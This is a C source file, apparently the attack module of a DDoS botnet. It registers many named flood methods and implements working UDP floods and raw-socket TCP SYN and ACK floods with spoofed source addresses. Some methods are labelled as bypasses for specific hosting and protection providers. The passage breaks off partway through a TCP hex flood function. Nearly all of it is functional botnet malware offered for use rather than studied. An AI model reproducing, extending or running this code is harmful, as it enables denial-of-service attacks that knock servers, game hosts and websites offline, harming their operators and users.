#include "includes.h"
#include "attack.h"
#include "protocol.h"
#include "rand.h"
#include "table.h"
#include "resolv.h"
#include "checksum.h"
#include "util.h"

/* Simple checksum helper for ICMP */
static uint16_t checksum_simple(void *buf, int len) {
    uint16_t *ptr = (uint16_t *)buf;
    uint32_t sum = 0;
    
    while (len > 1) {
        sum += *ptr++;
        len -= 2;
    }
    
    if (len == 1) {
        sum += *(uint8_t *)ptr;
    }
    
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>

static struct attack_method methods[ATK_VEC_MAX];
static int methods_len = 0;
static BOOL attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};

/* ============================================================================
 * ATTACK INITIALIZATION - Register all attack methods
 * ============================================================================ */
void attack_init(void) {
    int i = 0;

    /* UDP Floods (0-19) */
    methods[i].func = attack_udp_generic;
    methods[i++].type = ATK_VEC_UDP;

    methods[i].func = attack_udp_plain;
    methods[i++].type = ATK_VEC_UDPPLAIN;

    methods[i].func = attack_udp_std;
    methods[i++].type = ATK_VEC_STD;

    methods[i].func = attack_udp_nudp;
    methods[i++].type = ATK_VEC_NUDP;

    methods[i].func = attack_udp_hex;
    methods[i++].type = ATK_VEC_UDPHEX;

    methods[i].func = attack_udp_socket_raw;
    methods[i++].type = ATK_VEC_SOCKET_RAW;

    methods[i].func = attack_udp_samp;
    methods[i++].type = ATK_VEC_SAMP;

    methods[i].func = attack_udp_strong;
    methods[i++].type = ATK_VEC_UDPSTRONG;

    methods[i].func = attack_udp_hex;
    methods[i++].type = ATK_VEC_HEXFLD;

    methods[i].func = attack_udp_strong;
    methods[i++].type = ATK_VEC_STRONGHEX;

    methods[i].func = attack_udp_ovh;
    methods[i++].type = ATK_VEC_OVHUDP;

    methods[i].func = attack_udp_cudp;
    methods[i++].type = ATK_VEC_CUDP;

    methods[i].func = attack_udp_icee;
    methods[i++].type = ATK_VEC_ICEE;

    methods[i].func = attack_udp_randhex;
    methods[i++].type = ATK_VEC_RANDHEX;

    methods[i].func = attack_udp_ovhdrop;
    methods[i++].type = ATK_VEC_OVHDROP;

    methods[i].func = attack_udp_nfo;
    methods[i++].type = ATK_VEC_NFO;

    /* TCP Floods (20-39) */
    methods[i].func = attack_tcp_raw;
    methods[i++].type = ATK_VEC_TCP;

    methods[i].func = attack_tcp_syn;
    methods[i++].type = ATK_VEC_SYN;

    methods[i].func = attack_tcp_ack;
    methods[i++].type = ATK_VEC_ACK;

    methods[i].func = attack_tcp_stomp;
    methods[i++].type = ATK_VEC_STOMP;

    methods[i].func = attack_tcp_hex;
    methods[i++].type = ATK_VEC_HEX;

    methods[i].func = attack_tcp_stdhex;
    methods[i++].type = ATK_VEC_STDHEX;

    methods[i].func = attack_tcp_xmas;
    methods[i++].type = ATK_VEC_XMAS;

    methods[i].func = attack_tcp_all;
    methods[i++].type = ATK_VEC_TCPALL;

    methods[i].func = attack_tcp_frag;
    methods[i++].type = ATK_VEC_TCPFRAG;

    methods[i].func = attack_tcp_asyn;
    methods[i++].type = ATK_VEC_ASYN;

    methods[i].func = attack_tcp_usyn;
    methods[i++].type = ATK_VEC_USYN;

    methods[i].func = attack_tcp_ackerpps;
    methods[i++].type = ATK_VEC_ACKERPPS;

    methods[i].func = attack_tcp_mix;
    methods[i++].type = ATK_VEC_TCPMIX;

    methods[i].func = attack_tcp_bypass;
    methods[i++].type = ATK_VEC_TCPBYPASS;

    methods[i].func = attack_tcp_nflag;
    methods[i++].type = ATK_VEC_NFLAG;

    methods[i].func = attack_tcp_ovhnuke;
    methods[i++].type = ATK_VEC_OVHNUKE;

    /* Special Attacks (40-49) */
    methods[i].func = attack_udp_vse;
    methods[i++].type = ATK_VEC_VSE;

    methods[i].func = attack_udp_dns;
    methods[i++].type = ATK_VEC_DNS;

    methods[i].func = attack_gre_ip;
    methods[i++].type = ATK_VEC_GREIP;

    methods[i].func = attack_gre_eth;
    methods[i++].type = ATK_VEC_GREETH;

    methods[i].func = attack_homeslam;
    methods[i++].type = ATK_VEC_HOMESLAM;

    methods[i].func = attack_udpbypass;
    methods[i++].type = ATK_VEC_UDPBYPASS;

    methods[i].func = attack_mixed;
    methods[i++].type = ATK_VEC_MIXED;

    /* HTTP/HTTPS (50-59) */
    methods[i].func = attack_http;
    methods[i++].type = ATK_VEC_HTTP;

    methods[i].func = attack_https;
    methods[i++].type = ATK_VEC_HTTPS;

    methods[i].func = attack_browserem;
    methods[i++].type = ATK_VEC_BROWSEREM;

    /* Cloudflare (60+) */
    methods[i].func = attack_cf;
    methods[i++].type = ATK_VEC_CF;

    methods_len = i;
}

/* ============================================================================
 * ATTACK CONTROL FUNCTIONS
 * ============================================================================ */
void attack_kill_all(void) {
    int i;
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
        if (attack_ongoing[i]) {
            int pid = fork();
            if (pid == 0) {
                kill(0, SIGKILL);
                exit(0);
            }
            waitpid(pid, NULL, 0);
            attack_ongoing[i] = 0;
        }
    }
}

void attack_parse(char *buf, int len) {
    uint8_t type;
    uint8_t targs_len;
    struct attack_target targs[255];
    uint8_t opts_len;
    struct attack_option opts[255];
    int i;

    if (len < 2) return;

    /* Parse attack type */
    type = buf[0];
    if (type >= ATK_VEC_MAX) return;

    /* Parse targets */
    targs_len = buf[1];
    if (targs_len == 0 || len < 2 + (targs_len * 5)) return;

    for (i = 0; i < targs_len; i++) {
        targs[i].addr.s_addr = ntohl(*(uint32_t *)(buf + 2 + (i * 5)));
        targs[i].netmask = buf[2 + (i * 5) + 4];
    }

    /* Parse options */
    if (len < 2 + (targs_len * 5) + 1) return;
    opts_len = buf[2 + (targs_len * 5)];

    uint8_t *ptr = buf + 2 + (targs_len * 5) + 1;
    for (i = 0; i < opts_len && i < 255; i++) {
        if (ptr - (uint8_t *)buf >= len - 2) break;
        uint8_t opt_len = ptr[1];
        opts[i].key = ptr[0];
        opts[i].val = (char *)(ptr + 2);
        ptr += 2 + opt_len;
    }

    /* Launch attack */
    attack_start(-1, type, targs_len, targs, opts);
}

void attack_start(int fd, uint8_t type, int targs_len, struct attack_target *targs, struct attack_option *opts) {
    int i, j;

    /* Find slot for new attack */
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
        if (!attack_ongoing[i])
            break;
    }

    if (i == ATTACK_CONCURRENT_MAX) return;

    /* Fork and start attack */
    attack_ongoing[i] = TRUE;

    if (fork() == 0) {
        /* Find and call attack method */
        for (j = 0; j < methods_len; j++) {
            if (methods[j].type == type) {
                methods[j].func(targs[0].addr.s_addr, targs[0].netmask, targs, targs_len, opts, 0);
                break;
            }
        }

        exit(0);
    }
}

char *attack_get_opt_str(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    int i;
    for (i = 0; i < opts_len; i++) {
        if (opts[i].key == key)
            return opts[i].val;
    }
    return NULL;
}

int attack_get_opt_int(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    char *val = attack_get_opt_str(targs_len, opts, opts_len, key);
    if (val == NULL) return 0;
    return util_atoi(val);
}

uint32_t attack_get_opt_ip(int targs_len, struct attack_option *opts, int opts_len, uint8_t key) {
    char *val = attack_get_opt_str(targs_len, opts, opts_len, key);
    if (val == NULL) return 0;
    return inet_addr(val);
}

/* ============================================================================
 * UDP ATTACK METHODS
 * ============================================================================ */

/* Generic UDP flood */
static void attack_udp_generic(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport, sport;
    uint16_t payload_size;
    BOOL rand_payload;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    rand_payload = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_RAND);

    payload = malloc(payload_size);
    if (rand_payload)
        rand_str(payload, payload_size);
    else
        memset(payload, 'A', payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            if (rand_payload) rand_str(payload, payload_size);
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* UDP plain flood */
static void attack_udp_plain(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1024;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* STD flood - Simple TCP/UDP data flood */
static void attack_udp_std(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* NUDP flood */
static void attack_udp_nudp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = "\x00\x00\x00\x00";
    int payload_len = 4;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_len, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    close(fd);
}

/* UDP HEX flood */
static void attack_udp_hex(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    for (i = 0; i < payload_size; i++) {
        payload[i] = rand_next() % 256;
    }

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* Socket raw UDP */
static void attack_udp_socket_raw(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport, sport;
    uint16_t payload_size;
    uint8_t tos, ttl;
    uint16_t ident;
    uint8_t df;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    tos = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TOS);
    ttl = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TTL);
    if (ttl == 0) ttl = 64;

    ident = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_IDENT);
    df = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_DF);

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(payload);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* SAMP game UDP flood */
static void attack_udp_samp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char payload[512];
    uint16_t dport;
    int payload_len;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 7777; /* Default SAMP port */

    /* SAMP query payload */
    payload[0] = 0xFE;
    payload[1] = 0xFD;
    payload[2] = 0x00;
    payload[3] = 0x01;
    payload[4] = 0x02;
    payload[5] = 0x03;
    payload[6] = 0x04;
    memcpy(payload + 7, "SAMPQUERY", 9);
    payload_len = 16;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) return;

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_len, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    close(fd);
}

/* Strong UDP flood */
static void attack_udp_strong(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 1024;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* OVH UDP bypass */
static void attack_udp_ovh(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 256;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* Custom UDP flood */
static void attack_udp_cudp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* ICE UDP flood */
static void attack_udp_icee(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* Random HEX flood */
static void attack_udp_randhex(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    for (i = 0; i < payload_size; i++) {
        payload[i] = rand_next() % 256;
    }

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* OVH drop flood */
static void attack_udp_ovhdrop(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 256;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* NFO flood */
static void attack_udp_nfo(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    struct sockaddr_in addr_sin;
    char *payload;
    uint16_t dport;
    uint16_t payload_size;

    payload_size = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_PAYLOAD_SIZE);
    if (payload_size == 0) payload_size = 512;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    payload = malloc(payload_size);
    rand_str(payload, payload_size);

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        free(payload);
        return;
    }

    addr_sin.sin_family = AF_INET;
    addr_sin.sin_port = htons(dport);

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            sendto(fd, payload, payload_size, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(payload);
    close(fd);
}

/* ============================================================================
 * TCP ATTACK METHODS
 * ============================================================================ */

/* TCP SYN flood */
static void attack_tcp_syn(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    struct sockaddr_in addr_sin;
    uint16_t dport, sport;
    uint8_t ttl;
    uint16_t ident;
    uint8_t df;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    ttl = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TTL);
    if (ttl == 0) ttl = 64;

    ident = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_IDENT);
    df = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_DF);

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(pktsize);
    iph->id = htons(ident != 0 ? ident : rand_next() % 0xFFFF);
    iph->frag_off = df ? htons(0x4000) : 0;
    iph->ttl = ttl;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) {
        free(pktbuf);
        return;
    }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));

            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP ACK flood */
static void attack_tcp_ack(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    struct sockaddr_in addr_sin;
    uint16_t dport, sport;
    uint8_t ttl;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    ttl = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TTL);
    if (ttl == 0) ttl = 64;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
    memset(pktbuf, 0, pktsize);

    struct iphdr *iph = (struct iphdr *)pktbuf;
    struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(pktsize);
    iph->id = htons(rand_next() % 0xFFFF);
    iph->ttl = ttl;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand_next() % 0xFFFFFFFF;

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = rand_next() % 0xFFFFFFFF;
    tcph->ack_seq = rand_next() % 0xFFFFFFFF;
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->window = htons(65535);

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) { free(pktbuf); return; }

    int opt = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt));

    addr_sin.sin_family = AF_INET;

    for (i = 0; i < targs_len; i++) {
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        while (attack_ongoing[0]) {
            iph->daddr = targs[i].addr.s_addr;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, pktbuf, pktsize, 0, (struct sockaddr *)&addr_sin, sizeof(addr_sin));
        }
    }

    free(pktbuf);
    close(fd);
}

/* TCP stomp */
static void attack_tcp_stomp(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    uint16_t dport;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) return;

    for (i = 0; i < targs_len; i++) {
        fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd == -1) continue;

        struct sockaddr_in addr_sin;
        addr_sin.sin_family = AF_INET;
        addr_sin.sin_port = htons(dport);
        addr_sin.sin_addr.s_addr = targs[i].addr.s_addr;

        fcntl(fd, F_SETFL, O_NONBLOCK);

        if (connect(fd, (struct sockaddr *)&addr_sin, sizeof(addr_sin)) == 0 || errno == EINPROGRESS) {
            char *data = "\x00\x00\x00\x00";
            send(fd, data, 4, MSG_MORE);
        }

        close(fd);
    }

    while (attack_ongoing[0]) {
        usleep(10000);
    }
}

/* TCP HEX flood */
static void attack_tcp_hex(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs, int targs_len, struct attack_option *opts, int opts_len) {
    int fd, i;
    char *pktbuf;
    int pktsize;
    uint16_t dport, sport;
    uint8_t ttl;

    dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = rand_next() % 0xFFFF;

    sport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_SPORT);
    if (sport == 0) sport = rand_next() % 0xFFFF;

    ttl = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_IP_TTL);
    if (ttl == 0) ttl = 64;

    pktsize = sizeof(struct iphdr) + sizeof(struct tcphdr);
    pktbuf = malloc(pktsize);
